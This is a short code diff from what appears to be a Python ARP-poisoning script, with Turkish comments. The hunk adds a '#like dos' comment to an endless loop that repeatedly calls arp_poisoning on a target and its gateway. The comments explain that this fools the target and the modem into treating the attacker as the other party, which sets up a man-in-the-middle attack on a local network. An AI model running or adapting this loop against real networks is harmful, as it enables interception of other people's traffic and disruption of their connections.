@@ -51,7 +51,7 @@ user_gateway_ip = user_ips.gateway_ip
 number=0
 
 try:
-    while True:
+    while True: #like dos
         arp_poisoning(user_target_ip,user_gateway_ip) #Bu request ve response hedef sistemi kandıracak.
         arp_poisoning(user_gateway_ip,user_target_ip) #Bu request ve response modemi kandıracak.Böylelikle modem bizi hedef sistem olarak görecek.
         number +=2
